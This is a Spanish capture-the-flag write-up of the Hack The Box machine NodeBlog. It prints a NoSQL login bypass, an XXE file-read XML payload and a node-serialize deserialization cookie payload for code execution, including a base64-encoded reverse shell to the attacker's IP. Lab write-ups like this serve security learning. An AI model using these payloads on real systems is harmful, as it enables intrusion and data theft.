---
layout: single
title: NodeBlog - Hack The Box
excerpt: "Para resolver ésta máquina interceptamos la solicitud a la hora de iniciar sesión, logrando así manipular los campos & logrando consigo inyectar NoSQL malicioso para un usuario válido, logrando así burlar el sistema de inicio de sesión, para posterior a ello abusar de subidas de archivo en formato .xml convirtiéndolo en XXE, logrando ver el código fuente de la página web, para aprovecharnos de éste. Hacemos una cookie serialiada maliciosa para llevar a cabo un RCE y entablarnos una Reverse Shell, para posterior a ello enumerar credenciales en texto claro de la DB & aprovecharnos de los SUDOERS."
date: 2023-11-20
classes: wide
header:
  teaser: /assets/images/htb-writeup-nodeblog/nodeblog_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
tags:
  - NoSQL Injection (Authentication Bypass)
  - XXE File Read
  - NodeJS Deserialization Attack (IIFE Abusing)
  - Mongo Database Enumeration
  - abusing sudoers
---

Para resolver ésta máquina interceptamos la solicitud a la hora de iniciar sesión, logrando así manipular los campos & logrando consigo inyectar NoSQL malicioso para un usuario válido, logrando así burlar el sistema de inicio de sesión, para posterior a ello abusar de subidas de archivo en formato .xml convirtiéndolo en XXE, logrando ver el código fuente de la página web, para aprovecharnos de éste. Hacemos una cookie serialiada maliciosa para llevar a cabo un RCE y entablarnos una Reverse Shell, para posterior a ello enumerar credenciales en texto claro de la DB & aprovecharnos de los SUDOERS.


# PortScan
__________
```
# Nmap 7.93 scan initiated Mon Nov 20 09:49:30 2023 as: nmap -sCV -p22,5000 -oN targeted 10.10.11.139
Nmap scan report for 10.10.11.139
Host is up (0.063s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ea8421a3224a7df9b525517983a4f5f2 (RSA)
|   256 b8399ef488beaa01732d10fb447f8461 (ECDSA)
|_  256 2221e9f485908745161f733641ee3b32 (ED25519)
5000/tcp open  http    Node.js (Express middleware)
|_http-title: Blog
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Nov 20 09:49:45 2023 -- 1 IP address (1 host up) scanned in 14.89 seconds
```

# Web Site
_______________
![](/assets/images/htb-writeup-nodeblog/Pasted image 20231120112841.png)

Realicé un **FUZZING** web para posibles directorios existentes en la máquina víctima, pero no encontré nada interesante, probé ingresando usuarios default típicos, y ví qué decía cuando un usuario era válido y cuando no, descubriendo así que el usuario "**admin**" existe, pero ninguna contraseña típica funcionó, por lo qué opté por interceptar esto con el Proxy **BurpSuite**.

# Proxy BurpSuite
___

Aquí empecé a probar distintas inyecciones de **DB's** , entre ellas NoSQL's, descubriendo qué era vulnerable a inyecciones **NoSQL**, pero con un body en formato Json y no DATA.

![](/assets/images/htb-writeup-nodeblog/Pasted image 20231120113655.png)

Como conocemos un usuario **válido**, usamos la operativa "**not equal**" para hacer un ByPass de contraseña, logrando así entrar como Admin.

En resumen,  al usuario "**admin**" ser válido, y la contraseña no ser igual a "**test**" **ByPassareamos** ésto porque verdaderamente la contraseña **NO ES IGUAL** a "test." logrando así iniciar sesión y seteandonos una cookie.

![](/assets/images/htb-writeup-nodeblog/Pasted image 20231120115202.png)

Qué por lo que parece es una cookie de sesión URL **encodeada**, y sí vamos a la web nos veríamos logueados.

![](Pasted image 20231120115651.png)


Vemos qué podemos subir archivo, así que intentamos subir un archivo cualquiera, por ejemplo un .txt a ver qué pasa...
![](/assets/images/htb-writeup-nodeblog/Pasted image 20231120120049.png)

Debemos subir un archivo en formato **.XML**, así qué se me ocurre ver si podemos tratar de llevar a cabo un **XXE** con una entidad maliciosa para leer el "**/etc/passwd**".

**PoC .xml:**
```xml
 <?xml version="1.0" encoding="ISO-8859-1"?>
   <!DOCTYPE foo [  
   <!ELEMENT foo ANY >
 <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
 
 <post>
   <title>Example Post</title>
   <description>Example Description</description>
   <markdown>&xxe;</markdown>
 </post>
```

Una vez subido, vemos qué logramos leer el "**passwd**" gracias al **XXE**.

![](/assets/images/htb-writeup-nodeblog/Pasted image 20231120120634.png)

Y también descubrimos que el usuario "**admin**" es un usuario válido del sistema.

Traté de leer sí existía la **"id_rsa"** de SSH, pero no encontré nada, pero curiosamente al enviar un cuerpo corrompido al servidor como solicitud de logueo, nos devolvería rutas existente como error.

![](/assets/images/htb-writeup-nodeblog/Pasted image 20231120121359.png)

Nos reportaría rutas, lo qué me da a entender que son rutas donde está alojado el servidor, por ende veo varios **"/opt/blog"**, así que modifico mi **XXE** para leer del "**/opt/blog/server.js**" logrando así ver el código fuente.

![](/assets/images/htb-writeup-nodeblog/Pasted image 20231120121703.png)

Nos chiva el código fuente qué por detrás **deserializa** la cookie **serializada**, para interpretarla, por lo qué se me ocurre de primer poner una cookie serializada maliciosa, qué a la hora de deserializarse por detrás haga lo qué me interese, investigando encontré qué podemos llevar a cabo en estas situaciones un **IIFE**.

**IIFE:** no es más qué mediante dos paréntesis colocado de forma específica en el código, ejecute ese comando colocado en los paréntesis antes de deserializar en éste caso la cookie.

[((Artículo sobre IIFE y como podemos explotar deserialización y serialización en Node JS))](https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/)

**PoC** Payload para llevar a cabo el "**RCE**" mediante el **"IFFE"**:
```js
{"rce":"_$$ND_FUNC$$_function (){require('child_process').exec('cmd',function(error, stdout, stderr) { console.log(stdout) }); }()"}
```

Como vimos al principio, la cookie está **urlencodeada**, así qué este payload lo urlencodeamos para ponerlo como cookie en nuestro navegador, y a continuación estaré probando si logramos llevar a cabo la **RCE** seteando una cookie qué intente obtener un recurso desde la máquina víctima a mi máquina con "wget".
![](/assets/images/htb-writeup-nodeblog/Pasted image 20231120124717.png)

![](/assets/images/htb-writeup-nodeblog/Pasted image 20231120124740.png)

Por ende, estamos llevando a cabo el **RCE** éxitosamente, así que procederé a entablarme una **Reverse Shell** con el payload en base64.
```bash
{"rce":"_$$ND_FUNC$$_function (){require('child_process').exec('echo IyEvYmluL2Jhc2gKCmJhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNS80NDMgMD4mMQo= | base64 -d | bash',function(error, stdout, stderr) { console.log(stdout) }); }()"}
```

Convertirmos en **URLENCODE**, seteamos eso como cookie de sesión, y al recargar obtendríamos nuestra **Reverse Shell**.
![](/assets/images/htb-writeup-nodeblog/Pasted image 20231120125050.png)

Ya quedaría darle Tratamiento a la TTY, que sino sabes como te recomiendo [((LEER ÉSTE POST))](https://4uli.github.io/tratamiento-tty/)

# Escalada de Privilegios
___
Sí vemos los puertos abiertos, veremos puertos qué de manera externa no teníamos acceso.
![](/assets/images/htb-writeup-nodeblog/Pasted image 20231120125343.png)

Y sí indagamos en internet, veríamos que este puerto suele ser el de **MongoDB** por defecto, así que intentamos entrar...
```bash
mongo
```

Logrando así conectarnos con la DB, ahora deberíamos listar DB's que nos interesen con contenido de sus tablas, columnas...

![](/assets/images/htb-writeup-nodeblog/Pasted image 20231120125522.png)

Encontrando así las credenciales del usuario actual, para posterior ver sus permisos SUDOERS.

```bash
sudo -l
```

![](/assets/images/htb-writeup-nodeblog/Pasted image 20231120125604.png)

Viendo que podemos ejecutar lo que sea, es decir podemos convertirnos en Root con:
```bash
sudo su
```

![[/assets/images/htb-writeup-nodeblog/Pasted image 20231120125651.png]]
